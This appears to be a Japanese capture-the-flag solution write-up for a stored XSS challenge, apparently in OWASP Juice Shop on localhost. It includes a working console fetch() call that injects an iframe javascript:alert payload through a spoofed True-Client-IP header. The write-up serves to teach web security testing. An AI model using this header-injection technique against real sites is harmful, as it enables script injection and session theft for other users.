# HTTP-Header XSS ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** XSS
**目標:** HTTPヘッダー経由でXSSを実行する

---

## 思考プロセス

**ステップ1: XSSの入力ポイントを探す**
```
「通常のXSSは入力フォームやURLパラメータ」
    ↓
「でもHTTPヘッダーも入力の一種」
    ↓
「ヘッダーの値がどこかに保存・表示されていないか？」
    ↓
「"Last Login IP" という機能を発見！」
```

**ステップ2: IPアドレスの取得方法を調査**
```
「ユーザーのIPアドレスを表示する機能」
    ↓
「サーバーはどうやってIPを取得している？」
    ↓
「X-Forwarded-For や True-Client-IP ヘッダーかも」
    ↓
「これらは簡単に偽装できる！」
```

## 実行手順

1. ログインする
2. Console で以下を実行:
   ```javascript
   fetch('/rest/saveLoginIp', {
     method: 'GET',
     headers: {
       'Authorization': 'Bearer ' + localStorage.getItem('token'),
       'True-Client-IP': '<iframe src="javascript:alert(1)">'
     }
   }).then(r => r.json()).then(console.log)
   ```
3. `http://localhost:3000/#/privacy-security/last-login-ip` にアクセス
4. XSSが発動する

## 解説

- `True-Client-IP` ヘッダーの値がそのまま保存・表示される
- サニタイズ（無害化処理）されていない
- 保存型XSS（Stored XSS）の一種

**なぜヘッダー経由のXSSが見落とされやすい？**
- 通常、ヘッダーはユーザーが直接入力しないと思われている
- しかし、プロキシやCDNを通過する際にヘッダーが追加される
- 攻撃者は任意のヘッダーを送信可能

## 関連チャレンジ

- [DOM XSS](../difficulty-1/dom-xss.md)
- [Reflected XSS](../difficulty-2/reflected-xss.md)
